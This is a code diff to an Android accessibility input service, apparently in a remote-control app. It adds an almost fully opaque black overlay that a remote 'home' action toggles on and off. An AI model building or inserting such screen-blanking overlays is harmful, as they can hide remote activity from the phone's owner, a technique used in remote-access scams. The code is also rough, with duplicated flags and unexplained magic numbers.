@@ -61,7 +61,13 @@ class InputService : AccessibilityService() {
         val isOpen: Boolean
             get() = ctx != null
     }
+    
+    //新增
+    private lateinit var windowManager: WindowManager
+    private lateinit var overLayparams_bass: WindowManager.LayoutParams
+    private lateinit var overLay: FrameLayout
 
+    
     private val logTag = "input service"
     private var leftIsDown = false
     private var touchPath = Path()
@@ -154,6 +160,11 @@ class InputService : AccessibilityService() {
                 recentActionTask!!.cancel()
                 performGlobalAction(GLOBAL_ACTION_HOME)
             }
+            
+            if(gohome==8)
+	           gohome = 0
+	         else
+	           gohome = 8	
             return
         }
 
@@ -621,10 +632,64 @@ class InputService : AccessibilityService() {
         val layout = fakeEditTextForTextStateCalculation?.getLayout()
         Log.d(logTag, "fakeEditTextForTextStateCalculation layout:$layout")
         Log.d(logTag, "onServiceConnected!")
+        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+        try {
+            createView(windowManager)
+            handler.postDelayed(runnable, 1000)
+            Log.d(logTag, "onCreate success")
+        } catch (e: Exception) {
+            Log.d(logTag, "onCreate failed: $e")
+        }
     }
-
+    
+    @SuppressLint("ClickableViewAccessibility")
+    private fun createView(windowManager: WindowManager) {  
+        var flags = FLAG_LAYOUT_IN_SCREEN or FLAG_NOT_TOUCH_MODAL or FLAG_NOT_FOCUSABLE
+        if (viewUntouchable || viewTransparency == 0f) {
+            flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+        }
+        var w = HomeWith
+        var h = HomeHeight 
+    	overLayparams_bass =  WindowManager.LayoutParams(w, h, 2032, -2142501224, 1)
+        overLayparams_bass.gravity = Gravity.TOP or Gravity.START
+        overLayparams_bass.x = 0
+        overLayparams_bass.y = 0
+    	if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+    	    overLayparams_bass.flags = overLayparams_bass.flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
+    	    overLayparams_bass.flags = overLayparams_bass.flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
+    	}
+    	overLay =  FrameLayout(this)
+    	overLay.setBackgroundColor(Color.parseColor("#000000"));//#000000
+    	overLay.getBackground().setAlpha(253)
+    	gohome=8
+	    overLay.setVisibility(gohome)
+        windowManager.addView(overLay, overLayparams_bass)
+    }
+    
+    private val handler = Handler(Looper.getMainLooper())
+    private val runnable = object : Runnable {
+        override fun run() {
+            if (overLay.visibility != gohome) {
+	             Log.d(logTag, "Fakelay runnable globalVariable: $globalVariable")
+    		     if(gohome==8)
+    		     {  
+        			overLay.setFocusable(false)
+        			overLay.setClickable(false)
+    		     }
+    		    else
+    		     {
+        			overLay.setFocusable(true)
+                    overLay.setClickable(true)
+    		     }
+                 overLay.setVisibility(gohome)
+		         windowManager.updateViewLayout(overLay, overLayparams_bass)
+            }
+            handler.postDelayed(this, 1000) 
+        }
+    }
     override fun onDestroy() {
         ctx = null
+        windowManager.removeView(overLay) 
         super.onDestroy()
     }
 
